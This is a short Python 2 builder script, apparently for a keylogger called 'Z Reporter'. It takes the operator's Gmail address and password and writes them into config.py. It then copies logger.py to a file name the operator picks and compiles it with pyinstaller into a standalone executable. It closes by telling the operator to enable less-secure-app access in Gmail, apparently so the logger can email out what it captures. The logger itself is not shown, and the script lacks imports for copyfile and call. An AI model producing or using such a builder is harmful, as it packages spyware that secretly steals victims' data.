#!/usr/bin/env python

HEADER = """
__________  __________                             __                
\____    /  \______   \ ____ ______   ____________/  |_  ___________ 
  /     /    |       _// __ \\\\____ \ /  _ \_  __ \   __\/ __ \_  __ \\
 /     /_    |    |   \  ___/|  |_> >  <_> )  | \/|  | \  ___/|  | \/
/_______ \   |____|_  /\___  >   __/ \____/|__|   |__|  \___  >__|   
        \/          \/     \/|__|                           \/       
"""

print(HEADER)

email = raw_input("Email : ")
password = raw_input("password : ")
file_name = raw_input("File Name : ")


with open("config.py",'w') as out:
    out.write("#!/usr/bin/env python\n\n")
    out.write("\nEMAIL = \"" + email + "\"")
    out.write("\nPASSWORD = \"" + password + "\"")
    out.write("\nFILE_NAME = \"" + file_name + "\"")

print("[+] Writeing python reporter to source/" + file_name)
copyfile("logger.py", "source/" + file_name)

print("[+] Generating executable.")
call("pyinstaller --onefile source/" + file_name, shell=True)
print("\n[+] Executable is stored in dist/" + file_name)

print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")